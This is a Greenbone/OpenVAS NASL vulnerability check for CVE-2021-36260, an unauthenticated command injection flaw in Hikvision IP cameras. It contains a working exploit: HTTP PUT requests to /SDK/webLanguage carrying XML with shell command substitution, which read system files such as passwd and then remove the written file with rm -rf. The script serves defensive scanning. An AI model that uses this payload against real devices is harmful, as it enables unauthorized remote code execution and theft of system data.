# Copyright (C) 2022 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:hikvision:ip_camera";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.148631");
  script_version("2022-08-24T09:49:35+0000");
  script_tag(name:"last_modification", value:"2022-08-24 09:49:35 +0000 (Wed, 24 Aug 2022)");
  script_tag(name:"creation_date", value:"2022-08-24 03:18:31 +0000 (Wed, 24 Aug 2022)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-10-15 17:12:00 +0000 (Fri, 15 Oct 2021)");

  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");

  script_cve_id("CVE-2021-36260");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Hikvision IP Camera RCE Vulnerability (HSRC-202109-01) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2022 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_hikvision_ip_camera_detect.nasl");
  script_mandatory_keys("hikvision/ip_camera/detected");
  script_require_ports("Services/www", 8081);

  script_tag(name:"summary", value:"Multiple Hikvision IP cameras are prone to a remote code
  execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP requests and checks the responses.");

  script_tag(name:"insight", value:"A command injection vulnerability in the web server of some
  Hikvision product due to insufficient input validation.

  Notes: This flaw is / was known to be exploted by:

  - the Mirai-based Botnet 'Moobot' in 2021

  - possibly Mission2025/APT41 or APT10 threat actors in 2022 according to some analysis linked in
  the references");

  script_tag(name:"impact", value:"An attacker can exploit the vulnerability to launch a command
  injection attack by sending some messages with malicious commands.");

  script_tag(name:"affected", value:"Multiple Hikvision IP cameras. Please see the referenced vendor
  advisory on more info on the affected devices.");

  script_tag(name:"solution", value:"See the referenced vendor advisory for a solution.");

  script_xref(name:"URL", value:"https://www.hikvision.com/en/support/cybersecurity/security-advisory/security-notification-command-injection-vulnerability-in-some-hikvision-products/security-notification-command-injection-vulnerability-in-some-hikvision-products/");
  script_xref(name:"URL", value:"https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html");
  script_xref(name:"URL", value:"https://www.fortinet.com/blog/threat-research/mirai-based-botnet-moobot-targets-hikvision-vulnerability");
  script_xref(name:"URL", value:"https://www.cyfirma.com/hikvision-surveillance-cameras-vulnerabilities/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url1 = "/SDK/webLanguage";

headers = make_array("X-Requested-With", "XMLHttpRequest",
                     "Content-Type", "application/x-www-form-urlencoded");

files = traversal_files("linux");

vt_strings = get_vt_strings();
filename = vt_strings["default_rand"];

foreach pattern (keys(files)) {
  payload = '<?xml version="1.0" encoding="UTF-8"?><language>$(cat /' + files[pattern] + '>webLib/' +
             filename + ')</language>';

  req = http_post_put_req(port: port, url: url1, data: payload, add_headers: headers, method: "PUT");
  http_keepalive_send_recv(port: port, data: req);

  url2 = "/" + filename;
  req = http_get_req(port: port, url: url2, add_headers: headers);
  res = http_keepalive_send_recv(port: port, data: req);

  if (res =~ "^HTTP/1\.[01] 200" && egrep(pattern: pattern, string: res)) {
    result = chomp(http_extract_body_from_response(data: res));
    report = 'It was possible to execute the command "cat /' + files[pattern] + '".\n\nResult:\n'
             + result;
    security_message(port: port, data: report);

    # nb: Cleanup / remove the file again
    payload = '<?xml version="1.0" encoding="UTF-8"?><language>$(rm -rf webLib/' + filename +
              '>webLib/' + filename + ')</language>';
    req = http_post_put_req(port: port, url: url1, data: payload, add_headers: headers, method: "PUT");
    http_keepalive_send_recv(port: port, data: req);
    req = http_get_req(port: port, url: url2, add_headers: headers);
    http_keepalive_send_recv(port: port, data: req);
    exit(0);
  }
}

exit(0); #nb: Some devices might have some limited size for the payload
